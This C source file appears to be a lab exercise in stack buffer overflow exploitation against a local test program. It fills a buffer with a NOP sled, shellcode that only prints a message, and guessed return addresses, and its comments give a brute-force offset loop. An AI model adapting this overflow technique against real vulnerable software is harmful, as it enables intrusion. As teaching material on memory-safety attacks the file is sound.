/**
    Buffer length is fixed depending on the prog: 56 bytes.
    Alignemennt of NOPs + shellcode: not important.
    Launch with: for i in $(seq 0 20 4000); do echo $i; ./exploit-test1 $i; done
    Successful on offset 3800.


    Memory map
    ----------
    Arg_str_addr
    Buffer_addr

    Buffer[0]
        -
        -
        -
    Buffer[n]
      S_ebp
      S_eip
    Argv[1]_addr
**/

/**
    Analysis
    --------
    gdb:    At the end of main: ret instruction. Smash the stack so that the the address
            on the top of the stack is arbitrary.
            Stack: 48 bytes + s_esp (4 bytes ).
            At ret, esp = s_esp-4
            -4 offset: due to previous instruction.

    Buffer: NOPs+shellcode+NOPs_address+[NOPs_address]_address
    Launch with: for i in $(seq 0 20 4000); do echo $i; ./exploit-test2 $i; done

**/


#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BUF_LEN 56
#define NOPS 15

// n bytes
const char shellcode[] = "\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\xeb\x0d\x59\xb2\x13\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xee\xff\xff\xff\x53\x68\x65\x6c\x6c\x63\x6f\x64\x65\x20\x6d\x65\x73\x73\x61\x67\x65\x21\x0a";

unsigned int get_esp()
{
    __asm__("movl %esp, %eax"); // mov?
}

int main(int argc, char *argv[])
{
    if(argc < 2){
        exit(EXIT_SUCCESS);
    }

    int ret_addr = get_esp() + atoi(argv[1]);
    int i,j; // Looping variables
    int *bufptr; // To write 4 bytes at a time
    char *arg[3], buf[BUF_LEN];


    // Fill buffer with return address
    bufptr = (int*)buf;
    for(i=0; i<BUF_LEN; i +=4)
        *bufptr++ = ret_addr;

    for(i=0; i<NOPS; i++)
        buf[i]= 0x90;

    for(j=0;j<strlen(shellcode);j++)
        buf[i++]=shellcode[j];

    arg[0] = "./test1";
    arg[1] = buf;
    arg[2] = NULL;

    execve(arg[0], arg, NULL);

    return EXIT_SUCCESS;
}
